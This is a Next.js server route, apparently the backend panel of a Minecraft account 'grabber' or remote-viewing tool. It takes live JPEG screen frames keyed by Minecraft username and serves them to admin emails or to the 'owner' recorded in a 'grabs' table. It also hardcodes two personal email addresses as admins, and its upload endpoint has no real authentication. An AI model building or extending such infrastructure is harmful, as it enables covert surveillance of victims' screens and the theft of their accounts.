export const dynamic = 'force-dynamic';

import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

const memFrames = {};

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

function getClient() {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { cookies: { getAll() { return []; }, setAll() {} } }
  );
}

export async function POST(request) {
  try {
    const authHeader = request.headers.get('authorization');
    const contentType = request.headers.get('content-type');

    let username = 'unknown';
    if (authHeader) {
      username = authHeader.replace('Bearer ', '');
    }

    if (contentType === 'image/jpeg') {
      const buffer = await request.arrayBuffer();
      const base64 = Buffer.from(buffer).toString('base64');
      const frame = 'data:image/jpeg;base64,' + base64;
      const now = new Date().toISOString();

      memFrames[username] = { frame, timestamp: Date.now() };

      try {
        const supabase = getClient();
        await supabase
          .from('stream_frames')
          .upsert(
            { username, frame, updated_at: now },
            { onConflict: 'username' }
          );
      } catch (e) {
        // Supabase failed, memory still has it
      }

      return NextResponse.json({ ok: true });
    }

    return NextResponse.json({ error: 'Invalid request' }, { status: 400 });
  } catch (e) {
    return NextResponse.json({ error: e.message }, { status: 500 });
  }
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const username = searchParams.get('username');
  const now = Date.now();

  let supabaseRows = [];
  try {
    const supabase = getClient();
    const { data } = await supabase.from('stream_frames').select('username, updated_at');
    supabaseRows = data || [];
  } catch (e) {}

  const allFrames = {};
  for (const row of supabaseRows) {
    allFrames[row.username] = new Date(row.updated_at).getTime();
  }
  for (const [name, data] of Object.entries(memFrames)) {
    if (!allFrames[name] || data.timestamp > allFrames[name]) {
      allFrames[name] = data.timestamp;
    }
  }

  if (username) {
    const supabaseAuth = getClientAuth(request);
    const { data: { user } } = await supabaseAuth.auth.getUser();
    if (!user) return NextResponse.json({ online: false });

    const isAdmin = ADMIN_EMAILS.includes(user.email);

    if (!isAdmin) {
      const supabase = getClient();
      const { data: grab } = await supabase
        .from('grabs')
        .select('id')
        .eq('minecraft_username', username)
        .eq('owner_email', user.email)
        .limit(1)
        .single();
      if (!grab) return NextResponse.json({ online: false });
    }

    const ts = allFrames[username];
    if (!ts || now - ts > 10000) {
      return NextResponse.json({ online: false });
    }

    let frame = null;
    if (memFrames[username] && memFrames[username].timestamp === ts) {
      frame = memFrames[username].frame;
    } else {
      try {
        const supabase = getClient();
        const { data: row } = await supabase
          .from('stream_frames')
          .select('frame')
          .eq('username', username)
          .single();
        frame = row?.frame || null;
      } catch (e) {}
    }

    return NextResponse.json({ online: true, frame, timestamp: ts });
  }

  const online = Object.entries(allFrames)
    .filter(([, ts]) => now - ts < 10000)
    .map(([name, ts]) => ({ username: name, timestamp: ts }));

  if (online.length === 0) {
    return NextResponse.json({ online: [] });
  }

  const supabaseAuth = getClientAuth(request);
  const { data: { user } } = await supabaseAuth.auth.getUser();
  const isAdmin = ADMIN_EMAILS.includes(user?.email);

  if (isAdmin) {
    return NextResponse.json({ online });
  }

  if (!user) {
    return NextResponse.json({ online: [] });
  }

  const supabase = getClient();
  const ownerEmails = {};
  for (const u of online) {
    if (!ownerEmails[u.username]) {
      const { data: grab } = await supabase
        .from('grabs')
        .select('owner_email')
        .eq('minecraft_username', u.username)
        .limit(1)
        .single();
      ownerEmails[u.username] = grab?.owner_email || null;
    }
    u.owner_email = ownerEmails[u.username];
  }

  const filtered = online.filter(u => u.owner_email === user.email);
  return NextResponse.json({ online: filtered });
}